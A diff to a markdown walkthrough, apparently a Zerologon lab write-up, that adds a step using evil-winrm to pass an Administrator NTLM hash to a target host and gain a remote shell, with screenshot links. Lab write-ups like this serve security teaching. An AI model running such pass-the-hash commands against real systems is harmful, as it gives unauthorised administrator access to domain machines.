@@ -46,16 +46,8 @@ Now, to pull the secret off the target machine: <br />
 `
 ![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/5.png) <br />
 
+Now we can pass the hash with winrmc: <br/>
+`└─$ evil-winrm -i 10.10.25.29 -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568                                                                                                              130 ⨯
 
-
-
-
-
-
-
-
-
-
-
-
-
+`
+![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/6.png)
